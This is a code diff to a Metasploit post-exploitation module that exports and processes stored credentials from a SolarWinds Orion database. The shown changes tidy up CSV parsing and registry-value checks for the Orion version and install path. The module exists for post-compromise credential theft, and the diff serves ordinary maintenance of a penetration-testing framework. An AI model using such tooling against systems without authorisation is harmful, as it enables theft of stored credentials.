@@ -110,7 +110,6 @@ class MetasploitModule < Msf::Post
 
   def export
     csv = dump_orion_db
-
     total_rows = csv.count
     print_good("#{total_rows} rows exported, #{@orion_total_secrets} unique CredentialIDs")
     encrypted_data = csv.to_s.delete("\000")
@@ -272,7 +271,16 @@ class MetasploitModule < Msf::Post
     fail_with(Msf::Exploit::Failure::NoTarget, "CSV file #{file_name} not found") unless ::File.file?(file_name)
 
     csv_rows = ::File.binread(file_name)
-    csv = ::CSV.parse(csv_rows.gsub("\r", ''), row_sep: :auto, headers: :first_row, quote_char: "\x00", skip_blanks: true)
+    csv = ::CSV.parse(
+      csv_rows.gsub("\r", ''),
+      row_sep: :auto,
+      headers: :first_row,
+      quote_char: "\x00",
+      skip_blanks: true,
+      header_converters: ->(f) { f.strip },
+      converters: ->(f) { f ? f.strip : nil }
+    )
+
     fail_with(Msf::Exploit::Failure::NoTarget, "Error importing CSV file #{file_name}") unless csv
 
     @orion_total_secrets = csv['CredentialID'].uniq.count
@@ -287,7 +295,7 @@ class MetasploitModule < Msf::Post
     fail_with(Msf::Exploit::Failure::NoTarget, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)
 
     orion_version = registry_getvaldata(reg_key, 'Version')
-    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find Version registry entry under #{reg_key}") unless orion_version
+    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find Version registry entry under #{reg_key}") if orion_version.empty?
 
     @orion_build = ::Rex::Version.new(orion_version)
     fail_with(Msf::Exploit::Failure::NoTarget, 'Could not parse Orion version information') unless @orion_build > ::Rex::Version.new('0')
@@ -300,7 +308,7 @@ class MetasploitModule < Msf::Post
     fail_with(Msf::Exploit::Failure::NoTarget, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)
 
     orion_path = registry_getvaldata(reg_key, 'InstallPath').to_s
-    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find InstallPath registry entry under #{reg_key}") unless orion_path
+    fail_with(Msf::Exploit::Failure::NoTarget, "Could not find InstallPath registry entry under #{reg_key}") if orion_path.empty?
 
     print_status("SolarWinds Orion Install Path: #{orion_path}")
     orion_path
